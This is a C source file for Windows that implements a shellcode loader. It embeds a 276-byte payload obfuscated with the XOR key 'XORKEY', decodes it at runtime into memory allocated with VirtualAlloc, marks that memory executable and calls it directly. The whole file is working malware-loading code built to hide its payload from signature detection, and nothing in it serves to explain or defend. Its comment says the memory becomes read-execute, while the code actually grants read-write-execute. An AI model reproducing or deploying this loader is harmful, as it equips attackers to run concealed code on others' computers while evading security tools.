#include <windows.h>
#include <stdio.h>


void XOR(char * ciphertext, size_t ciphertext_len, char * key, size_t key_len) {
    int myByte = 0;
    for (int idx = 0;  idx < ciphertext_len; idx++) {
        if (myByte == key_len)
        { 
            myByte = 0;
        }
        
        ciphertext[idx] = ciphertext[idx] ^ key[myByte];
        myByte++;
    }
}


int main(void)
{
	DWORD result;
	char shellcode[276] = {"\xA4\x07\xD1\xAF\xB5\xB1\x98\x4F\x52\x4B\x04\x08\x19\x1F\x00\x1A\x13\x11\x69\x9D\x37\x03\xCE\x0B"
"\x38\x07\xD9\x19\x5D\x11\xD3\x1D\x72\x03\xCE\x2B\x08\x07\x5D\xFC\x0F\x13\x15\x7E\x9B\x03\x74\x99"
"\xF4\x73\x33\x37\x47\x75\x78\x0E\x93\x82\x48\x18\x59\x8E\xB0\xA6\x17\x18\x09\x07\xD9\x19\x65\xD2"
"\x1A\x73\x1A\x4A\x95\xD2\xD8\xC7\x52\x4B\x45\x11\xDD\x8F\x26\x2C\x0D\x58\x88\x1F\xD9\x03\x5D\x1D"
"\xD3\x0F\x72\x02\x44\x89\xBB\x19\x1A\xB4\x8C\x18\xD3\x7B\xDA\x03\x44\x8F\x15\x7E\x9B\x03\x74\x99"
"\xF4\x0E\x93\x82\x48\x18\x59\x8E\x6A\xAB\x30\xA8\x14\x4C\x1E\x6F\x4D\x1C\x61\x9E\x27\x93\x1D\x1D"
"\xD3\x0F\x76\x02\x44\x89\x3E\x0E\xD9\x47\x0D\x1D\xD3\x0F\x4E\x02\x44\x89\x19\xC4\x56\xC3\x0D\x58"
"\x88\x0E\x0A\x0A\x1D\x07\x01\x15\x13\x13\x04\x00\x19\x15\x1A\xC8\xA9\x79\x19\x1D\xAD\xAB\x1D\x18"
"\x01\x15\x1A\xC0\x57\xB0\x0F\xB0\xAD\xB4\x18\x11\xE2\x4E\x52\x4B\x45\x59\x58\x4F\x52\x03\xC8\xD4"
"\x59\x4E\x52\x4B\x04\xE3\x69\xC4\x3D\xCC\xBA\x8C\xE3\xBF\xE7\xE9\x13\x18\xE2\xE9\xC7\xF6\xD8\xA6"
"\x8D\x07\xD1\x8F\x6D\x65\x5E\x33\x58\xCB\xBE\xB9\x2D\x4A\xE9\x0C\x56\x2B\x37\x25\x52\x12\x04\xD0"
"\x82\xB0\x87\x28\x24\x35\x3B\x61\x37\x33\x20\x59"};
	char xorkey[] = "XORKEY";

	
	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Decode the shellcode
	XOR((char *) dest, sizeof(shellcode), xorkey, strlen(xorkey));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
